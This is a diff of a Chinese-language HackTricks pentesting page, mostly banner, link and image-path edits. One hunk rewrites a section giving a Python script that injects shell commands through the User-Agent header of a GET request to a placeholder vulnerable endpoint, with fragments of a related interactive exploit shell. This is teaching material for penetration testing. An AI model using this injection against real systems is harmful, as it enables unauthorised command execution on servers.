@@ -2,17 +2,17 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>
 
 * 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者你想要**获取最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 可以轻松构建和**自动化工作流程**，使用全球**最先进的**社区工具。\
@@ -88,34 +88,33 @@ return resp.json()
 def get_random_string(guid, path):
 return ''.join(random.choice(string.ascii_letters) for i in range(10))
 ```
-## 使用Python命令执行远程代码执行（RCE）的方法
+## Python命令以利用远程命令执行（RCE）
 
-To exploit a Remote Code Execution (RCE) vulnerability using Python, you can use the following command:
-
-使用Python命令来利用远程代码执行（RCE）漏洞，可以使用以下命令：
+To exploit Remote Command Execution (RCE) vulnerabilities using Python, you can use the following command:
 
 ```python
 import requests
 
 url = "http://target-website.com/vulnerable-endpoint"
-payload = "; <malicious code>"
+command = "command-to-execute"
 
-response = requests.get(url + payload)
+payload = "; " + command + " 2>&1"
+headers = {"User-Agent": payload}
+
+response = requests.get(url, headers=headers)
 
 print(response.text)
 ```
 
-In the above code, you need to replace `"http://target-website.com/vulnerable-endpoint"` with the actual vulnerable endpoint URL. The `payload` variable should contain the malicious code you want to execute.
+Replace `http://target-website.com/vulnerable-endpoint` with the URL of the vulnerable endpoint on the target website. Replace `command-to-execute` with the command you want to execute remotely.
 
-在上述代码中，你需要将`"http://target-website.com/vulnerable-endpoint"`替换为实际的易受攻击的端点URL。`payload`变量应包含你想要执行的恶意代码。
+The payload is constructed by appending the command to execute with `;` and redirecting the error output to the standard output (`2>&1`). This helps capture the command's output in the response.
 
-By sending a GET request to the vulnerable endpoint with the payload appended, you can trigger the RCE vulnerability and execute the malicious code on the target server.
+The `User-Agent` header is used to inject the payload into the request. By manipulating the User-Agent header, you can exploit RCE vulnerabilities that allow command injection.
 
-通过向易受攻击的端点发送带有附加的payload的GET请求，你可以触发RCE漏洞并在目标服务器上执行恶意代码。
+After sending the request, the response is printed, which will contain the output of the executed command.
 
-Please note that exploiting RCE vulnerabilities without proper authorization is illegal and unethical. This information is provided for educational purposes only. Always ensure you have proper authorization and follow ethical guidelines when conducting security testing or penetration testing activities.
-
-请注意，未经适当授权利用RCE漏洞是非法和不道德的。此信息仅供教育目的。在进行安全测试或渗透测试活动时，请始终确保获得适当的授权并遵守道德准则。
+Remember to use this technique responsibly and only on systems you have permission to test.
 ```python
 import requests
 import re
@@ -142,7 +141,7 @@ return 1
 term = Terminal()
 term.cmdloop()
 ```
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。
 立即获取访问权限：
